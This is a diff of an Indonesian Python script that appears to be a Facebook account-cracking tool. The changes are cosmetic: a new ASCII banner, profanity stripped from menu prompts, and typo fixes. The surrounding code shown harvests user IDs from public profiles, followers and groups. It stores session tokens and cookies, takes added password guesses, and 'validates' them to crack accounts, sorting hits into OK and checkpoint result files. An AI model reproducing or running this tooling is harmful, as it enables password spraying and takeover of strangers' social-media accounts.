@@ -396,10 +396,16 @@ def tahun(fx):
 #------------------[WELCOME ]-----------------#
 def banner():
 	print(f'''\t
-\x1b[1;97m____ _  _ _    _   _    ___  ____ ____ _  _  -->Zr-X
-         \x1b[1;97m|  | |\ | |     \_/     |__] |__/ |___ |\/|  --> OVER POWER
-         \x1b[1;97m|__| | \| |___   |      |    |  \ |___ |  |  --> \033[32mSC : FREE
-                     \n\033[32mKEY YOUR --> XXXXXXXXXXXX --> Licensi Anda  unlimited                                                                           
+\33[1;96m.::!!!!!!!:.
+\33[1;96m  .!!!!!:.                        .:!!!!!!!!!!!!
+\33[1;96m  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+\33[1;96m      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+\33[1;96m     $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+\33[1;96m      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+\33[1;96m      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+\33[1;96m       "*$bd$$$$      '*$$$$$$$$$$$o+#"
+\33[1;96m            """"          """""""
+                     \n\033[32mKEY YOUR --> Licensi Anda  unlimited                                                                           
                        {u}▪︎{k}▪︎{h}▪︎{sir} RECODE BY:Zr-X{x}{u}▪︎{k}▪︎{h}▪︎{x}''')                                                                         
 
 #--------------------[WELCOME]--------------#
@@ -497,9 +503,9 @@ def login_lagi334():
 							print(f"\x1b[1;97m[\x1b[1;92m*\x1b[1;97m] Token :\x1b[1;92m {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("{white}login berhasil tersimpan di .token.txt && .cok.txt");exit()
+							print("{white}Login Berhasil Cookie/Token Tersimpan di .token.txt && .cok.txt");exit()
 			except Exception as e:
-				print(" Cookies Invalid bro")
+				print(" Cookies Invalid ")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
 				print(e)
 				time.sleep(3)
@@ -519,16 +525,16 @@ def menu(my_name,my_id):
 	ip = requests.get("https://api.ipify.org").text
 	gh = 'github.com/Al-Vino'
 	cetak(nel('\tSelamat Datang  [yellow]%s[white] Alay '%(my_name)))
-	print(f'Your Idz : '+str(my_id))
+	print(f'Your Id : '+str(my_id))
 	print(f'Your Ip  : {ip}')
 	print('')
 	print('1. Crack-Publik ')
 	print('2. Crack-Pollower ')
-	print('3. Crack-Grop   ')
+	print('3. Crack-Group   ')
 	print('4. Carck-File   ')
-	print('5. Check Hasil Ngewe   ')
-	print('0. Logout (Hapos Cookie)      ')
-	_____kang__cabul_____ = input('\n|──> Selet : ')
+	print('5. Check Hasil Crack   ')
+	print('0. Logout (Hapus Cookie)      ')
+	_____kang__cabul_____ = input('\n>> Input : ')
 	if _____kang__cabul_____ in ['1']:
 		dump_massal()
 	elif _____kang__cabul_____ in ['2']:
@@ -542,10 +548,10 @@ def menu(my_name,my_id):
 	elif _____kang__cabul_____ in ['0']:
 		os.system('rm -rf token.txt')
 		os.system('rm -rf cok.txt')
-		print('>> Sukses Logout+Hapus Cokie ')
+		print('>> Sukses Logout+Hapus Cookie ')
 		exit()
 	else:
-		print('>> Pilih Yang Bener Asu ')
+		print('>> Pilih Yang Bener  ')
 		back()
 def error():
 	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
@@ -585,7 +591,7 @@ def result():
 			geeh = input('\n>> Pilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener Kontol ')
+				print('>> Pilih Yang Bener  ')
 				back()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
@@ -628,7 +634,7 @@ def result():
 			geeh = input(f'\nPilih : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print('>> Pilih Yang Bener Kontol ')
+				print('>> Pilih Yang Bener  ')
 				back()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
@@ -647,7 +653,7 @@ def result():
 	elif kz in ['3']:
 		back()
 	else:
-		print('>> Pilih Yang Bener Kontol ')
+		print('>> Pilih Yang Bener ')
 		back()
 #-------------------[ CRACK-PUBLIK ]----------------#
 def dump_massal():
@@ -668,7 +674,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('|Masukan Id Yang Ke : '+str(yz)+' : ')
+		kl = input('Masukan Id Yang Ke : '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -686,7 +692,7 @@ def dump_massal():
 			exit()
 	try:
 		print('')
-		print(f'|Total Id Terkumpul : {h}'+str(len(id)))
+		print(f'Total Id Terkumpul : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -891,7 +897,7 @@ def setting():
 	print('2. Akun Muda ')
 	print('3. Akun Random ')
 	print('')
-	hu = input('|──> Input : ')
+	hu = input('>> Input : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -910,7 +916,7 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print('>> Pilih Yang Bener Kontooll ')
+		print('>> Pilih Yang Bener ')
 		exit()
 	print('1. Validate')
 	###print('└──> 3. Touch  ')
@@ -920,14 +926,14 @@ def setting():
 	if hc in ['1','01']:
 		method.append('validate')
 	elif hc in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print('>> Pilih Yang Bener ')
 		setting()
 	else:
 		method.append('validate')
 	print('')
-	_jembot_ = input('|Tambahkan Apk? [Y/t] : ')
+	_jembot_ = input('Tambahkan Apk? [Y/t] : ')
 	if _jembot_ in ['']:
-		print('>> Pilih Yang Bener Kontol ')
+		print('>> Pilih Yang Bener ')
 		back()
 	elif _jembot_ in ['y','Y']:
 		taplikasi.append('ya')
@@ -937,7 +943,7 @@ def setting():
 	if pwplus in ['y','Y']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
-		pwku=input('|Masukkan Katasandi Tambahan : ')
+		pwku=input('Masukkan Katasandi Tambahan : ')
 		pwkuh=pwku.split(',')
 		for xpw in pwkuh:
 			pwnya.append(xpw)
